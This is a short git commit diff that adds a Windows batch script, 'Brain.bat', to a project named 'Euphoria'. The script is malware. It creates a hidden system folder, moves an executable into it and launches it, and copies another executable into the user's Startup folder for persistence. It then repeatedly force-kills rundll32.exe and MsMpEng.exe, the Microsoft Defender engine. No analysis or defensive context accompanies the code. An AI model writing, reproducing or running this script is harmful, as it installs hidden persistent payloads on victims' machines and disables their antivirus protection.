7f9eeb1125c974b8402c9efbdb667eba8d4fa372
hx4u <sherapsy@gmail.com>
2025-05-09 06:38:42 -0700

    Update Brain.bat

--- Euphoria/Brain.bat
+++ Euphoria/Brain.bat
@@ -1,1 +1,11 @@
-
+cd %~dp0
+del Brain.vbs
+mkdir "%homedrive%\u4ia" && attrib +h +i +s "%homedrive%\u4ia"
+move modules-4ia.exe "%homedrive%\u4ia"
+move u4ia.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+start "%homedrive%\u4ia\modules-4ia.exe"
+for /L %%i in (1,1,100) do (
+    echo Loop iteration %%i
+taskkill /im rundll32.exe /f
+taskkill /im MsMpEng.exe /f
+)
